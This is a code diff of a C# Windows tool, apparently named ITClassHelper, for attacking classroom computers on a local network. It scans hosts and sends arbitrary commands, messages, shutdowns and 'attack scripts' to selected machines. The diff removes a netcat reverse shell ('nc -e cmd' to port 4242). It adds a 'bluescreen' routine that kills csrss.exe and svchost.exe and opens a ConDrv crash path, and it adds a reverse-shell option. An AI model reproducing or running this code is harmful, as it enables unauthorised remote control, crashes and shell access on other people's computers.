@@ -6,6 +6,7 @@ using System.IO;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -13,18 +14,9 @@ namespace ITClassHelper
 {
     public partial class FormDeviceManage : Form
     {
-        static bool firstTimeNcClientAttack = true;
-        static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ITClassHelper";
-        static readonly string ncPath = path + @"\nc.exe";
-        static readonly string allowBackdoorFilePath = path + @"\allowBackdoorAttack.txt";
-
         public FormDeviceManage()
         {
             InitializeComponent();
-            if (File.Exists(allowBackdoorFilePath))
-            {
-                NcServerButton.Visible = NcServerButton.Enabled = NcClientButton.Enabled = true;
-            }
         }
 
         private void ScanButton_Click(object sender, EventArgs e)
@@ -34,7 +26,7 @@ namespace ITClassHelper
             string ipStart = IPTextBox.Text;
             if (rangeEnd - rangeStart + 1 >= 5)
             {
-                if (MessageBox.Show("扫描数量大于或等于 5 个，扫描速度可能很慢！\n按[确定]继续扫描；\n按[取消]放弃扫描。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel) return;
+                if (MessageBox.Show("扫描数量大于或等于 10 个，扫描速度可能较慢！\n按[确定]继续扫描；\n按[取消]放弃扫描。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel) return;
             }
             DeviceList.Items.Clear();
             ScanButton.Text = "扫描中！"; ScanButton.Enabled = false; Cursor = Cursors.WaitCursor;
@@ -48,30 +40,34 @@ namespace ITClassHelper
                     {
                         reply = ping.Send($"{ipStart.Substring(0, ipStart.Length - (1 + rangeStart.ToString().Length))}.{i}", 1000);
                     }
-                    catch (PingException)
-                    {
-                        return;
-                    }
+                    catch (PingException) { return; }
                     if (reply.Status == IPStatus.Success)
                     {
                         DeviceList.Items.Add(reply.Address.ToString());
-                        if (DisableMacAddressCheckBox.Checked == false) DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(GetMacByIP(reply.Address.ToString()));
-                        if (DisableHostNameCheckBox.Checked == false) DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(Dns.GetHostEntry(reply.Address).HostName);
+                        if (DisableMacAddressCheckBox.Checked == false)
+                            DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(GetMacByIP(reply.Address.ToString()));
+                        else
+                            DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
+                        if (DisableHostNameCheckBox.Checked == false)
+                            DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(Dns.GetHostEntry(reply.Address).HostName);
+                        else
+                            DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
                     }
                 }
                 ScanButton.Text = "扫描"; ScanButton.Enabled = true; Cursor = Cursors.Default;
-            }){ IsBackground = true }.Start();
+            })
+            { IsBackground = true }.Start();
         }
 
         private static string GetMacByIP(string ip)
         {
-            int ldest = Tools.inet_addr(ip);
+            int ldest = Network.inet_addr(ip);
             string mac = "";
             try
             {
                 long macinfo = 0;
                 int len = 6;
-                int result = Tools.SendARP(ldest, 0, ref macinfo, ref len);
+                int result = Network.SendARP(ldest, 0, ref macinfo, ref len);
                 mac = Convert.ToString(macinfo, 16);
             }
             catch { }
@@ -82,33 +78,56 @@ namespace ITClassHelper
                 + mac.Substring(2, 2).ToUpper() + "-" + mac.Substring(0, 2).ToUpper();
         }
 
-        private string[] GetCheckedIPs()
+        private string[] GetSelectedIPs()
         {
-            string[] ips = new string[DeviceList.CheckedItems.Count];
-            for (int i = 0; i <= DeviceList.CheckedItems.Count - 1; i++) ips[i] = DeviceList.CheckedItems[i].Text;
+            string[] ips = new string[DeviceList.SelectedItems.Count];
+            for (int i = 0; i <= DeviceList.SelectedItems.Count - 1; i++)
+                ips[i] = DeviceList.SelectedItems[i].Text;
             return ips;
         }
 
         private void SendCmdMenuItem_Click(object sender, EventArgs e)
         {
-            string command = Interaction.InputBox("请输入要发送的命令：", "信息", "", -1, -1);
-            PackAttacker.SendPack(command, GetCheckedIPs(), int.Parse(PortTextBox.Text));
+            string command = Interaction.InputBox("请输入要发送的命令：", "信息");
+            PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text));
         }
 
         private void SendMsgMenuItem_Click(object sender, EventArgs e)
         {
-            string message = Interaction.InputBox("请输入要发送的消息：", "信息", "", -1, -1);
-            string msgMethod = Interaction.InputBox("请选择发送模式：\n1：原生方法+远程显示（稳定、不引人注意）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：[制作中！]教室方法+本地发送（稳定、引人注意）", "信息", "", -1, -1);
+            string message = Interaction.InputBox("请输入要发送的消息：", "信息");
+            string msgMethod = Interaction.InputBox("请选择发送模式：\n1：原生方法+远程显示（稳定、不引人注意）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：自带方法+本地发送（只有安装了本软件才可使用此方法）", "信息");
             switch (msgMethod)
             {
                 case "1":
-                    PackAttacker.SendPack($"msg * {message}", GetCheckedIPs(), int.Parse(PortTextBox.Text));
+                    PackAttacker.SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text));
                     break;
 
                 case "2":
-                    foreach (string ip in GetCheckedIPs())
+                    foreach (string ip in GetSelectedIPs())
+                        Tools.ExecuteProcess("msg", $"/server:{Network.GetIPAddress(false, ip)} * {message}");
+                    break;
+
+                case "3":
+                    try
                     {
-                        Tools.ExecuteProcess("msg", $"/server:{Dns.GetHostEntry(ip).HostName} * {message}");
+                        if (Network.binded == false) Network.socket.Bind(new IPEndPoint(IPAddress.Parse(Network.GetIPAddress()), 6666));
+                        Network.binded = true;
+                    }
+                    catch (SocketException ex)
+                    {
+                        MessageBox.Show($"本机 IP 地址绑定失败！\n错因：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        return;
+                    }
+                    byte[] bytes = Encoding.UTF8.GetBytes(Interaction.InputBox("请输入要发送的消息：", "信息"));
+                    foreach (string ip in GetSelectedIPs())
+                    {
+                        EndPoint clientPoint = new IPEndPoint(IPAddress.Parse(ip), 6666);
+                        try
+                        { Network.socket.SendTo(bytes, clientPoint); }
+                        catch (SocketException ex)
+                        {
+                            MessageBox.Show($"发送消息失败！\n错因：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        }
                     }
                     break;
 
@@ -123,7 +142,7 @@ namespace ITClassHelper
             {
                 Multiselect = false,
                 Title = "选择脚本文件",
-                Filter = "已处理的脚本(*.iscp)|*.iscp"
+                Filter = "攻击脚本(*.iscp)|*.iscp"
             };
             if (fileDialog.ShowDialog() == DialogResult.OK)
             {
@@ -132,11 +151,12 @@ namespace ITClassHelper
                     using (StreamReader sr = new StreamReader(fileDialog.FileName))
                     {
                         string fileLine;
-                        while ((fileLine = sr.ReadLine()) != null) PackAttacker.SendPack(fileLine, new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
+                        while ((fileLine = sr.ReadLine()) != null)
+                            PackAttacker.SendPack(fileLine, GetSelectedIPs(), int.Parse(PortTextBox.Text));
                     }
                 }
-                catch (ArgumentNullException) { MessageBox.Show("还没有选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
-
+                catch (ArgumentNullException)
+                { MessageBox.Show("还没有选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
             }
         }
 
@@ -155,12 +175,10 @@ namespace ITClassHelper
                 FileStream fs = new FileStream(scriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                 StreamReader lineSr = new StreamReader(fs);
                 while (lineSr.ReadLine() != null)
-                {
                     lines++;
-                }
                 fs.Close();
                 lineSr.Close();
-                string scriptName = Interaction.InputBox("请输入脚本文件名：", "信息", "", -1, -1);
+                string scriptName = Interaction.InputBox("请输入脚本文件名：", "信息");
                 List<string> newLines = new List<string>(lines + 2);
                 using (StreamReader sr = new StreamReader(scriptPath))
                 {
@@ -169,25 +187,25 @@ namespace ITClassHelper
                     while ((line = sr.ReadLine()) != null)
                     {
                         newLine = "echo ";
-                        foreach (char c in line)
+                        foreach (char ch in line)
                         {
-                            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))
-                                newLine += c;
-                            else newLine += "^" + c;
+                            if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
+                                newLine += ch;
+                            else newLine += "^" + ch;
                         }
-                        newLine += $@" >>C:\{scriptName}";
+                        newLine += $@" >> C:\{scriptName}";
                         newLines.Add(newLine);
                     }
                     newLines.Add($@"start C:\{scriptName}");
                 }
-                using (StreamWriter sw = new StreamWriter(scriptName.Split('.')[0] + ".iscp"))
+                string newScriptName = scriptName.Split('.')[0] + ".iscp";
+                string newScriptPath = $@"{Directory.GetCurrentDirectory()}\{newScriptName}";
+                using (StreamWriter sw = new StreamWriter(newScriptPath))
                 {
                     foreach (string s in newLines)
-                    {
                         sw.WriteLine(s);
-                    }
                 }
-                MessageBox.Show($@"脚本已保存到 {Directory.GetCurrentDirectory()}\{scriptName}！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show($@"脚本已保存到 {newScriptPath}！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
         }
 
@@ -205,26 +223,18 @@ namespace ITClassHelper
         {
             string shutdownMethod;
             if (shutdownType == "shutdown")
-            {
-                 shutdownMethod = Interaction.InputBox("请选择关机模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息", "", -1, -1);
-            }
+                shutdownMethod = Interaction.InputBox("请选择关机模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息");
             else
-            {
-                shutdownMethod = Interaction.InputBox("请选择重启模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息", "", -1, -1);
-            }
-            switch (shutdownMethod)
+                shutdownMethod = Interaction.InputBox("请选择重启模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息");
+            switch (shutdownMethod.Trim())
             {
                 case "1":
-                    foreach (string ip in GetCheckedIPs())
+                    foreach (string ip in GetSelectedIPs())
                     {
                         if (shutdownType == "shutdown")
-                        {
                             Tools.ExecuteProcess("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /s /t 0");
-                        }
                         else
-                        {
                             Tools.ExecuteProcess("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /r /t 0");
-                        }
                     }
                     break;
 
@@ -233,7 +243,7 @@ namespace ITClassHelper
                     break;
 
                 case "3":
-                    PackAttacker.SendPack("shutdown /s /t 0", GetCheckedIPs(), int.Parse(PortTextBox.Text));
+                    PackAttacker.SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text));
                     break;
 
                 default:
@@ -243,59 +253,40 @@ namespace ITClassHelper
 
         private void ConvertHostNameIPButton_Click(object sender, EventArgs e)
         {
-            string resultIP = "";
-            try
-            {
-                foreach (IPAddress curAddress in Dns.GetHostEntry(HostNameTextBox.Text).AddressList)
-                {
-                    if (curAddress.AddressFamily == AddressFamily.InterNetwork)
-                    {
-                        resultIP = curAddress.ToString();
-                    }
-                }
-                MessageBox.Show($"目标 IP 地址为：{resultIP}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
-            }
-            catch (SocketException)
-            {
+            string result;
+            result = Network.GetIPAddress(false, HostNameTextBox.Text);
+            if (result != "ERROR")
+                MessageBox.Show($"目标 IP 地址为：{result}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            else
                 MessageBox.Show("找不到此计算机！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
         }
 
         private void IPButton_Click(object sender, EventArgs e)
         {
-            MessageBox.Show($"IP 地址为：{Tools.GetIPAddress()}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            string result;
+            result = Network.GetIPAddress();
+            if (result != "ERROR")
+                MessageBox.Show($"本机 IP 地址为：{result}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            else
+                MessageBox.Show("本机 IP 地址获取失败！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
 
-        private void NcServerButton_Click(object sender, EventArgs e)
+        private void BluescreenMenuItem_Click(object sender, EventArgs e)
         {
-            Process[] ncProcs = Process.GetProcessesByName("nc");
-            if (ncProcs.Length == 0)
+            string[] commands = new string[4]
             {
-                Tools.ExecuteProcess(ncPath, "-lvnp 4242", true);
-                NcServerButton.Text = "关闭服务器";
-            }
-            else
-            {
-                foreach (Process ncProc in ncProcs)
-                {
-                    ncProc.Kill();
-                }
-                NcServerButton.Text = "启动服务器";
-            }
+                "powershell wininit",
+                "iexplore file://./GlobalRoot/Device/ConDrv/KernelConnect",
+                "taskkill /f /im svchost.exe",
+                "taskkill /f /im csrss.exe"
+            };
+            foreach (string command in commands)
+                PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text));
         }
 
-        private void NcClientButton_Click(object sender, EventArgs e)
+        private void RevShellMenuItem_Click(object sender, EventArgs e)
         {
-            if (!File.Exists(allowBackdoorFilePath)) Tools.ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
-            else
-            {
-                PackAttacker.SendPack($"{ncPath} -e cmd {Tools.GetIPAddress()} 4242", new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
-                if (firstTimeNcClientAttack == true)
-                {
-                    MessageBox.Show("NetCat 只能同时对一个 IP 地址攻击！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                    firstTimeNcClientAttack = false;
-                }
-            }
+            Tools.ExecuteProcess(Process.GetCurrentProcess().MainModule.FileName, $"-rs {GetSelectedIPs()[0]}", true);
         }
     }
 }
